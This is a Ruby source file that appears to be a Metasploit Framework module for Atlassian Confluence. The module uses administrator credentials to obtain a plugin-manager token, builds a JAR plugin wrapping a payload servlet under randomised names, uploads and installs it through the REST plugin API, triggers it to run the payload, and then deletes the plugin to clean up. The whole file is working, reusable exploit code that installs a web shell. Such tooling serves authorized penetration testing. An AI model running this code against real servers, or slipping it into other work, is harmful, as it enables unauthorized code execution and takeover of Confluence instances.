module Msf::Exploit::Remote::HTTP::Atlassian::Confluence::PayloadPlugin

  include Msf::Exploit::Retry
  def get_upm_token(admin_username, admin_password)
    # https://github.com/atlassian-api/atlassian-python-api/blob/master/atlassian/jira.py#L3356-L3361
    res = send_request_cgi({
                             'method' => 'HEAD',
                             'uri' => normalize_uri(target_uri.path, 'rest', 'plugins', '1.0/'),
                             'headers' => {
                               'X-Atlassian-Token' => 'no-check',
                               'Authorization' => basic_auth(admin_username, admin_password),
                               'Accept' => '*/*'
                             }
                           })
    fail_with(Failure::UnexpectedReply, 'Unable to retrieve the UPM token using the rest API') unless res&.code == 200 && res&.headers&.[]('upm-token')

    res.headers['upm-token']
  end

  def generate_payload_plugin(plugin_key, payload_endpoint)
    vprint_status('Generating payload plugin')
    webshell_jar = payload.encoded_jar(random: true)

    webshell_jar.add_file(
      'atlassian-plugin.xml',
      %(
<atlassian-plugin name="#{rand_text_alpha(8)}" key="#{plugin_key}" plugins-version="2">
  <plugin-info>
    <description>#{rand_text_alphanumeric(8)}</description>
    <version>#{rand(1024)}.#{rand(1024)}</version>
  </plugin-info>
  <servlet key="#{rand_text_alpha(8)}" class="#{webshell_jar.substitutions['metasploit']}.PayloadServlet">
    <url-pattern>#{normalize_uri(payload_endpoint)}</url-pattern>
  </servlet>
</atlassian-plugin>)
    )

    webshell_jar.add_file('metasploit/PayloadServlet.class', MetasploitPayloads.read('java', 'metasploit', 'PayloadServlet.class'))
    return webshell_jar.pack
  end

  def upload_payload_plugin(webshell_jar, admin_username, admin_password)
    vprint_status('Uploading payload plugin')
    post_data = Rex::MIME::Message.new
    post_data.add_part(webshell_jar, 'application/java-archive', 'binary', "form-data; name=\"plugin\"; filename=\"#{rand_text_alphanumeric(8..16)}.jar\"")
    post_data.add_part('', nil, nil, 'form-data; name="url"')

    data = post_data.to_s
    res = send_request_cgi({
                            'uri' => normalize_uri(target_uri.path, 'rest', 'plugins', '1.0/'),
                            'method' => 'POST',
                            'data' => data,
                            'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
                            'headers' => {
                              'Authorization' => basic_auth(admin_username, admin_password),
                              'Accept' => '*/*'
                            },
                            'vars_get' => {
                              'token' => get_upm_token(admin_username, admin_password)
                            }
                          })

    unless res&.code == 202
      fail_with(Failure::UnexpectedReply, 'Uploading plugin failed, unexpected reply code from endpoint: /rest/plugins/1.0/')
    end

    unless res.body =~ %r{<textarea>(.+)</textarea>}
      fail_with(Failure::UnexpectedReply, 'Uploading plugin failed, unexpected reply data from endpoint: /rest/plugins/1.0/')
    end

    begin
      plugin_json = JSON.parse(::Regexp.last_match(1))
    rescue JSON::ParserError
      fail_with(Failure::UnexpectedReply, 'Uploading plugin failed, failed to parse JSON data from endpoint: /rest/plugins/1.0/')
    end

    # We receive a JSON object like this:
    # <textarea>{"type":"INSTALL","pingAfter":100,"status":{"done":false,"statusCode":200,"contentType":"application/vnd.atl.plugins.install.installing+json","source":"JQEjEJBr.jar","name":"JQEjEJBr.jar"},"links":{"self":"/rest/plugins/1.0/pending/52227753-1c3e-496f-a4f4-d52a8b3850dc","alternate":"/rest/plugins/1.0/tasks/52227753-1c3e-496f-a4f4-d52a8b3850dc"},"timestamp":1697471602188,"userKey":"4028d6b28b294680018b39311d17001e","id":"52227753-1c3e-496f-a4f4-d52a8b3850dc"}</textarea>

    links_alternate = plugin_json&.dig('links', 'alternate')
    if links_alternate.nil?
      fail_with(Failure::UnexpectedReply, 'Uploading plugin failed, no alternate link in reply from endpoint: /rest/plugins/1.0/')
    end

    # The plugin is installed asynchronously, so we poll the server for installation to be completed.
    plugin_ready = retry_until_truthy(timeout: datastore['CONFLUENCE_PLUGIN_TIMEOUT']) do
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => normalize_uri(target_uri.path, links_alternate)
      )

      # We receive a JSON result to indicate if the plugin is finished installing.
      # {"links":{"self":"/rest/plugins/1.0/tasks/52227753-1c3e-496f-a4f4-d52a8b3850dc","result":"/rest/plugins/1.0/plkWITNH-key"},"done":true,"type":"INSTALL","progress":1.0,"pollDelay":100,"timestamp":1697471602188}

      if res&.code == 200
        begin
          res_json = JSON.parse(res.body)
          next res_json['done']
        rescue JSON::ParserError
          next false
        end
      end

      false
    end

    unless plugin_ready
      fail_with(Failure::TimeoutExpired, 'Uploading plugin failed, timeout while waiting to install.')
    end

  end

  def trigger_payload_plugin(payload_endpoint)
    vprint_status('Triggering payload plugin')
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'plugins', 'servlet', payload_endpoint)
    )

    unless res&.code == 200
      fail_with(Failure::PayloadFailed, "Triggering payload failed, unexpected reply from endpoint: /plugins/servlet/#{payload_endpoint}")
    end
  end

  def delete_payload_plugin(plugin_key, payload_endpoint, admin_username, admin_password)
    vprint_status('Deleting plugin...')

    res = send_request_cgi(
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'rest', 'plugins', '1.0', "#{plugin_key}-key"),
      'headers' => {
        'Authorization' => basic_auth(admin_username, admin_password),
        'Connection' => 'close'
      }
    )

    unless res&.code == 204
      print_warning("Deleting plugin failed, unexpected reply from endpoint: /plugins/servlet/#{payload_endpoint}")
    end
  end
end